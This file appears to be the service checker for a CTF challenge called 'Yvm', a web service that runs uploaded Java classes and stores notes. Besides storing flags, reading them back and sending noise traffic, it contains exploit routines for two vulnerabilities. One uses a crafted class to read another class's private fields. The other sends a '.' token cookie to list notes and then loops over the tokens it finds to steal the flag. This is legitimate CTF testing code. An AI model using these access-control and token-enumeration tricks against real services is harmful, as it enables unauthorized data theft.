import json
import os
import re
import secrets
import string
import subprocess
from itertools import zip_longest
from logging import LoggerAdapter
from pathlib import Path
from typing import Iterable, List, Optional, Tuple

from enochecker3 import (
    ChainDB,
    Enochecker,
    ExploitCheckerTaskMessage,
    GetflagCheckerTaskMessage,
    GetnoiseCheckerTaskMessage,
    HavocCheckerTaskMessage,
    MumbleException,
    PutflagCheckerTaskMessage,
    PutnoiseCheckerTaskMessage,
)
from enochecker3.utils import FlagSearcher, assert_equals, assert_in
from httpx import AsyncClient

NAME_LENGTH = 10

checker = Enochecker("Yvm", 3165)
app = lambda: checker.app


def grouper(iterable, n, fillvalue=None):
    args = [iter(iterable)] * n
    return zip_longest(*args, fillvalue=fillvalue)


def flag_to_ints(flag: str) -> Tuple[int, List[int]]:
    b = flag.encode()
    length = len(b)
    bs = grouper(b, 4, 0)
    ints = [int.from_bytes(b, byteorder="big", signed=True) for b in bs]
    return length, ints


def ints_to_flag(ints: List[int], length: int) -> str:
    bs = [int.to_bytes(i, 4, "big", signed=True) for i in ints]
    b = b"".join(bs)
    return b[:length].decode()


def ints_to_class(name: str, ints: List[int], length: int, acc_lvl: str) -> bytes:
    if acc_lvl == "private":
        data = private_class
    elif acc_lvl == "public":
        data = public_class
    else:
        ValueError("acc_level must be 'private' or 'public'")

    data = data.replace(TMPL_NAME.encode(), name.encode())
    data = data.replace(
        int.to_bytes(TMPL_LENGTH, length=4, byteorder="big"),
        int.to_bytes(length, length=4, byteorder="big", signed=True),
    )

    for i, v in enumerate(ints):
        data = data.replace(
            int.to_bytes(TMPL_VALS_I + i, length=4, byteorder="big"),
            int.to_bytes(v, length=4, byteorder="big", signed=True),
        )

    return data


def gen_class_template(
    name: str, ints: Iterable[int], length: int, acc_lvl: str
) -> str:
    assert acc_lvl in ["private", "public"]

    s = "class " + name + " {\n"
    s += "  private native static void print(int i);\n\n"
    s += f"  {acc_lvl} static int secret_length = {hex(length)};\n"
    for i, v in enumerate(ints):
        s += f"  {acc_lvl} static int secret_{str(i)} = {hex(v)};\n"
    s += "\n"
    s += "  public static void main(String[] args) {\n"
    s += "    print(secret_length);\n"
    for i, _ in enumerate(ints):
        s += f"    print(secret_{str(i)});\n"
    s += "  }\n"
    s += "}\n"
    return s


def gen_name() -> str:
    return "".join(secrets.choice(string.ascii_uppercase) for i in range(NAME_LENGTH))


@checker.putflag(0)
async def putflag_test(
    task: PutflagCheckerTaskMessage,
    logger: LoggerAdapter,
    client: AsyncClient,
    db: ChainDB,
) -> str:
    class_name = gen_name()

    l, ints = flag_to_ints(task.flag)
    class_body = ints_to_class(class_name, ints, l, "private")

    files = {"fileToUpload": (f"{class_name}.class", class_body)}
    r = await client.post("/runner.php", files=files)

    assert_equals(r.status_code, 200, "storing class with flag failed")

    if m := re.search(r"href='runner.php\?replay_id=(.*?)'", r.text):
        await db.set("replay_id", m.group(1))
        return class_name
    else:
        raise MumbleException("No replay_id returned by service")


def reconstruct_flag(text: str) -> str:
    text = text.split("<figure><figcaption>stdout</figcaption><pre><code spellcheck='false'>")[1]
    text = text.split("\n</code></pre></figure>")[0]

    try:
        length = int(text.split("\n")[0])
        ints = [int(i) for i in text.split("\n")[1:]]
    except:
        raise MumbleException("unexpected yvm output")

    return ints_to_flag(ints, length)


@checker.getflag(0)
async def getflag_test(
    task: GetflagCheckerTaskMessage,
    client: AsyncClient,
    logger: LoggerAdapter,
    db: ChainDB,
) -> None:
    try:
        token = await db.get("replay_id")
    except KeyError:
        raise MumbleException("Missing database entry from putflag")

    r = await client.get(f"/runner.php?replay_id={token}")
    assert_equals(r.status_code, 200, "getting note with flag failed")
    found = reconstruct_flag(r.text)
    expct = task.flag
    if found != expct:
        logger.error("flag not found")
        logger.error("replay_id " + token)
        logger.error("response body " + r.text)
        logger.error("found '" + found + "'")
        logger.error("expected '" + expct + "'")

    assert_equals(found, expct, "flag not found")


@checker.exploit(0)
async def exploit_test(
    task: ExploitCheckerTaskMessage,
    logger: LoggerAdapter,
    searcher: FlagSearcher,
    client: AsyncClient,
) -> Optional[str]:
    victm_name = task.attack_info
    assert victm_name

    explt_name = "E_" + gen_name()[:8]

    data = accessing_class
    data = data.replace(TMPL_ACCS.encode(), explt_name.encode())
    data = data.replace(TMPL_VCTM.encode(), victm_name.encode())

    files = {"fileToUpload": (f"{explt_name}.class", data)}
    r = await client.post("/runner.php", files=files)

    return reconstruct_flag(r.text)


@checker.putnoise(0)
async def putnoise_access_public(
    task: PutnoiseCheckerTaskMessage,
    logger: LoggerAdapter,
    client: AsyncClient,
    db: ChainDB,
) -> None:
    class_name = gen_name()

    secret = gen_name()
    l, ints = flag_to_ints(secret)
    class_body = ints_to_class(class_name, ints, l, "public")

    files = {"fileToUpload": (f"{class_name}.class", class_body)}
    r = await client.post("/runner.php", files=files)

    assert_equals(r.status_code, 200, "storing class with flag failed")

    await db.set("noise_info", {"class_name": class_name, "secret": secret})


@checker.getnoise(0)
async def getnoise_access_public(
    task: GetnoiseCheckerTaskMessage,
    logger: LoggerAdapter,
    client: AsyncClient,
    db: ChainDB,
) -> None:
    try:
        info = await db.get("noise_info")
    except KeyError:
        raise MumbleException("database info missing")
    victm_name = info["class_name"]
    secret = info["secret"]

    explt_name = "N_" + gen_name()[:8]

    data = accessing_class
    data = data.replace(b"G" * 10, explt_name.encode())
    data = data.replace(b"V" * 10, victm_name.encode())

    files = {"fileToUpload": (f"{explt_name}.class", data)}
    r = await client.post("/runner.php", files=files)

    assert_equals(reconstruct_flag(r.text), secret, "noise not found")


@checker.putflag(1)
async def putflag_test_1(
    task: PutflagCheckerTaskMessage,
    logger: LoggerAdapter,
    client: AsyncClient,
    db: ChainDB,
) -> None:
    r = await client.post("/notes.php", data={"name": "flag", "content": task.flag})
    try:
        token = r.cookies["token"]
        await db.set("token", token)
    except KeyError:
        raise MumbleException("'token' cookie was not set")


@checker.getflag(1)
async def getflag_test_1(
    task: GetflagCheckerTaskMessage,
    client: AsyncClient,
    logger: LoggerAdapter,
    db: ChainDB,
) -> None:
    try:
        token = await db.get("token")
    except KeyError:
        raise MumbleException("Missing database entry from putflag")

    r = await client.get(f"/notes.php?show=flag", cookies={"token": token})
    assert_in(task.flag, r.text, "flag not found")


@checker.exploit(1)
async def exploit_test_1(
    task: ExploitCheckerTaskMessage,
    logger: LoggerAdapter,
    searcher: FlagSearcher,
    client: AsyncClient,
) -> Optional[bytes]:
    r = await client.get(f"/notes.php", cookies={"token": "."})
    matches = re.findall(r"<a href='notes.php\?show=([a-z0-9]+)'>", r.text)
    r_matches = reversed(sorted(matches))
    for t in r_matches:
        r = await client.get("/notes.php?show=flag", cookies={"token": t})
        if flag := searcher.search_flag(r.text):
            return flag
    return None


@checker.havoc(0)
async def havoc_random_precomputed(
    task: HavocCheckerTaskMessage,
    logger: LoggerAdapter,
    client: AsyncClient,
):
    i = task.current_round_id % len(havocs)
    if i == 1:
        # to check all havocs with enochecker_test
        for klass, out in havocs:
            files = {"fileToUpload": (f"H_{gen_name()[:8]}.class", klass)}
            r = await client.post("/runner.php", files=files)
            assert out in r.text

    klass, out = havocs[i]
    files = {"fileToUpload": (f"H_{gen_name()[:8]}.class", klass)}
    r = await client.post("/runner.php", files=files)
    if not out in r.text:
        logger.error(f"havoc: expected {out} in {r.text}")
        raise MumbleException(f"Havoc {i}")


l = 20
TMPL_NAME = "A" * NAME_LENGTH
TMPL_LENGTH = 0xFEFEFEFE
TMPL_VALS_I = 0xDEADBEEF
cls = gen_class_template(
    TMPL_NAME, range(TMPL_VALS_I, TMPL_VALS_I + l), TMPL_LENGTH, "private"
)
with open("FooFoo.java", "w") as f:
    f.write(cls)

subprocess.run(["javac", "FooFoo.java"], check=True)

with open(f"{TMPL_NAME}.class", "rb") as f:  # type: ignore
    private_class: bytes = f.read()  # type: ignore

cls = gen_class_template(
    TMPL_NAME, range(TMPL_VALS_I, TMPL_VALS_I + l), TMPL_LENGTH, "public"
)
with open("FooFoo.java", "w") as f:  # type: ignore
    f.write(cls)  # type: ignore

subprocess.run(["javac", "FooFoo.java"], check=True)

with open(f"{TMPL_NAME}.class", "rb") as f:  # type: ignore
    public_class: bytes = f.read()  # type: ignore


TMPL_VCTM = "V" * NAME_LENGTH
TMPL_ACCS = "G" * NAME_LENGTH

vtm_class = "class " + TMPL_VCTM + " {\n"
vtm_class += "  static int secret_length;\n"
for i in range(l):
    vtm_class += f"  static int secret_{i};\n"
vtm_class += "}\n"

acc_class = "class " + TMPL_ACCS + " {\n"
acc_class += "  private native static void print(int i);\n"
acc_class += "  public static void main(String[] args) {\n"
acc_class += f"    print({TMPL_VCTM}.secret_length);\n"
for i in range(l):
    acc_class += f"    print({TMPL_VCTM}.secret_{i});\n"
acc_class += "  }\n"
acc_class += "}\n"

with open(f"{TMPL_VCTM}.java", "w") as f:
    f.write(vtm_class)

with open(f"FooFoo.java", "w") as f:
    f.write(acc_class)

subprocess.run(["javac", "FooFoo.java"], check=True)

with open(f"{TMPL_ACCS}.class", "rb") as f:  # type: ignore
    accessing_class: bytes = f.read()  # type: ignore

havocs = []

for d in Path("gen").iterdir():
    out_file = d / "out.txt"
    klass_file = [f for f in d.glob("*class")][0]
    with open(out_file) as f:
        out = f.read().strip()
    with open(klass_file, "rb") as f:
        klass = f.read()

    havocs.append((klass, out))
